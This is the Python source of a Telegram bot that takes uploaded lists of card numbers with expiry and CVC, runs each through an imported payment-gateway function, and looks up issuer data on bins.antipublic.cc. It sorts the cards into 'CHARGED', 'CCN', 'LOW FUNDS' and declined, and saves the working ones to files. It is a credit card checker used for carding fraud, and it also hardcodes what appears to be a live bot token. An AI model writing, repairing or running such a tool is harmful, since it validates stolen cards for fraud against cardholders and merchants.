import os
import time
import requests
import telebot
from telebot import types
from gatet import Tele
from datetime import datetime

# Bot config
BOT_TOKEN = "8426512661:AAHwyHErP1BVX_Ph7A-02vMrzVZH4KLidsY"
ALLOWED_CHAT_ID = "8202990461"

# Use single bot instance with skip_pending
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", skip_pending=True)

# Results file
RESULTS_FILE = "checked_cards.txt"
LIVE_FILE = "live_cards.txt"
DECLINED_FILE = "declined_cards.txt"

# Store bot state
bot_running = True

def is_authorized(message) -> bool:
    return str(message.chat.id) == ALLOWED_CHAT_ID

def save_result(card, result, category="UNKNOWN"):
    """Save result to appropriate file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save to main results file
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {card} | {result}\n")
    
    # Save to category-specific files
    if "Payment Successful!" in result:
        with open(LIVE_FILE, "a", encoding="utf-8") as f:
            f.write(f"{card} | {timestamp}\n")
    elif any(x in result for x in ["declined", "insufficient", "incorrect", "invalid", "error"]):
        with open(DECLINED_FILE, "a", encoding="utf-8") as f:
            f.write(f"{card} | {result} | {timestamp}\n")

def send_usage(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("Help", "Stop", "Stats")
    text = (
        "Send a .txt file to start checking.\n"
        "Each line: card|MM|YY|CVC\n"
        "Use Stop button (or /stop) to halt current run.\n"
        "Results saved in: checked_cards.txt\n"
        "Live cards saved in: live_cards.txt"
    )
    bot.reply_to(message, text, reply_markup=markup)

@bot.message_handler(commands=["start"])
def start(message):
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return
    send_usage(message)

@bot.message_handler(commands=["help"])
@bot.message_handler(func=lambda m: m.text and m.text.lower().strip() == "help")
def help_cmd(message):
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return
    send_usage(message)

@bot.message_handler(commands=["stats"])
@bot.message_handler(func=lambda m: m.text and m.text.lower().strip() == "stats")
def stats_cmd(message):
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return
    
    try:
        live_count = 0
        if os.path.exists(LIVE_FILE):
            with open(LIVE_FILE, "r") as f:
                live_count = len(f.readlines())
        
        total_count = 0
        if os.path.exists(RESULTS_FILE):
            with open(RESULTS_FILE, "r") as f:
                total_count = len(f.readlines())
        
        stats_text = (
            f"📊 Statistics:\n"
            f"✅ Live Cards: {live_count}\n"
            f"📁 Total Checked: {total_count}\n"
            f"📝 Results file: {RESULTS_FILE}\n"
            f"💳 Live cards file: {LIVE_FILE}"
        )
        bot.reply_to(message, stats_text)
    except Exception as e:
        bot.reply_to(message, f"Error getting stats: {str(e)}")

@bot.message_handler(commands=["stop"])
@bot.message_handler(func=lambda m: m.text and m.text.lower().strip() == "stop")
def stop_cmd(message):
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return
    global bot_running
    bot_running = False
    with open("stop.stop", "w") as file:
        file.write("stop")
    bot.reply_to(message, "Stop request saved. Current run will halt shortly.")

@bot.message_handler(content_types=["document"])
def main(message):
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return

    global bot_running
    bot_running = True
    
    dd = live = ch = ccn = cvv = lowfund = total_checked = 0
    ko = bot.reply_to(message, "Checking....⌛").message_id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        ee = bot.download_file(file_info.file_path)
    except Exception as e:
        bot.reply_to(message, f"Error downloading file: {str(e)}")
        return

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", "r") as file:
            lines = file.readlines()
            total = len(lines)

            for index, cc in enumerate(lines):
                cc = cc.strip()
                if not cc:
                    continue
                    
                # Check if stop requested
                if not bot_running or os.path.exists("stop.stop"):
                    bot.edit_message_text(
                        chat_id=message.chat.id, 
                        message_id=ko,
                        text=f'STOPPED ✅\nChecked: {total_checked}/{total}\nBOT BY ➜ @Mr_Vempire1'
                    )
                    if os.path.exists("stop.stop"):
                        os.remove("stop.stop")
                    return

                # Get BIN info
                try:
                    data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}', timeout=5).json()
                except Exception:
                    data = {}

                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                bank = data.get('bank', 'Unknown')

                # Process card
                start_time = time.time()
                try:
                    last = str(Tele(cc))
                    print(f"Card {cc}: {last}")  # Debug output
                except Exception as e:
                    print(f"Error processing {cc}: {e}")
                    last = f'Error: {str(e)}'
                end_time = time.time()
                execution_time = end_time - start_time

                total_checked += 1
                
                # Save result to file
                save_result(cc, last)

                # Update counters
                if 'Payment Successful!' in last:
                    ch += 1
                    bot.send_message(message.chat.id, f"✅ CHARGED: {cc}")
                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1
                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1
                    bot.send_message(message.chat.id, f"🔐 CCN: {cc}")
                elif 'insufficient funds' in last:
                    lowfund += 1
                    bot.send_message(message.chat.id, f"💸 LOW FUNDS: {cc}")
                else:
                    dd += 1

                # Update progress every 5 cards to avoid flooding
                if total_checked % 5 == 0 or total_checked == total:
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    mes.add(
                        types.InlineKeyboardButton(f"• Progress: {total_checked}/{total} •", callback_data='u8'),
                        types.InlineKeyboardButton(f"• CURRENT: {cc[:10]}... •", callback_data='u8'),
                        types.InlineKeyboardButton(f"• STATUS: {last[:30]} •", callback_data='u8'),
                        types.InlineKeyboardButton(f"✅ CHARGED: {ch}", callback_data='x'),
                        types.InlineKeyboardButton(f"🔐 CCN: {ccn}", callback_data='x'),
                        types.InlineKeyboardButton(f"🔓 CVV: {cvv}", callback_data='x'),
                        types.InlineKeyboardButton(f"💸 LOW FUNDS: {lowfund}", callback_data='x'),
                        types.InlineKeyboardButton(f"❌ DECLINED: {dd}", callback_data='x'),
                        types.InlineKeyboardButton(f"[ STOP CHECK ]", callback_data='stop')
                    )
                    bot.edit_message_text(
                        chat_id=message.chat.id, 
                        message_id=ko, 
                        text=f'Checking... {total_checked}/{total}\n@Mr_Vempire1', 
                        reply_markup=mes
                    )
                
                # Small delay to avoid rate limiting
                time.sleep(1)

    except Exception as e:
        print(f"Main error: {e}")
        bot.reply_to(message, f"Error: {str(e)}")

    # Final summary
    final_text = (
        f"✅ CHECK COMPLETED\n"
        f"📊 Results Summary:\n"
        f"✅ CHARGED: {ch}\n"
        f"🔐 CCN: {ccn}\n"
        f"🔓 CVV: {cvv}\n"
        f"💸 LOW FUNDS: {lowfund}\n"
        f"❌ DECLINED: {dd}\n"
        f"📁 Total Checked: {total_checked}\n\n"
        f"BOT BY ➜ @Mr_Vempire"
    )
    
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text)
    
    # Clean up
    if os.path.exists("combo.txt"):
        os.remove("combo.txt")
    if os.path.exists("stop.stop"):
        os.remove("stop.stop")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    global bot_running
    bot_running = False
    with open("stop.stop", "w") as file:
        file.write("stop")
    bot.answer_callback_query(call.id, "Stop signal sent!")

@bot.message_handler(commands=["getresults"])
def send_results(message):
    """Send the results files to user"""
    if not is_authorized(message):
        bot.reply_to(message, "Access denied.")
        return
    
    files_to_send = [RESULTS_FILE, LIVE_FILE, DECLINED_FILE]
    
    for filename in files_to_send:
        if os.path.exists(filename) and os.path.getsize(filename) > 0:
            try:
                with open(filename, "rb") as file:
                    bot.send_document(message.chat.id, file, caption=filename)
            except Exception as e:
                bot.reply_to(message, f"Error sending {filename}: {str(e)}")
        else:
            bot.reply_to(message, f"{filename} is empty or doesn't exist.")

if __name__ == "__main__":
    print("Bot started...")
    try:
        # Clear any existing offset
        bot.skip_pending = True
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except Exception as e:
        print(f"Bot crashed: {e}")
        # Wait and restart
        time.sleep(5)
